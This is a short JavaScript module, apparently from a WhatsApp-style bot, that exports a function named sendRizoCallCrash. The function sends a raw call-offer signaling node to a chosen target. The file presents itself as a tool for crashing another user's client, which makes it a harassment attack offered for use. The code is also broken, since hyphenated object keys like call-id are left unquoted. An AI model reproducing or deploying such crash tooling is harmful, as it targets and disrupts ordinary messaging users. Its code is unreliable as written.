// lib/rizo-call.js

async function sendRizoCallCrash(conn, target) {
    // Call offer / transport signaling node structure
    await conn.query({
        tag: 'call',
        attrs: {
            from: conn.user.id,
            to: target,
            id: conn.generateMessageTag(),
        },
        content: [
            {
                tag: 'offer',
                attrs: {
                    call-id: Math.random().toString(36).substring(2, 15),
                    call-creator: conn.user.id,
                },
                content: [
                    {
                        tag: 'audio',
                        attrs: {
                            enc: 'opus',
                            rate: '8000',
                        },
                    },
                ],
            },
        ],
    });
}

const callSleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

module.exports = { sendRizoCallCrash, callSleep };
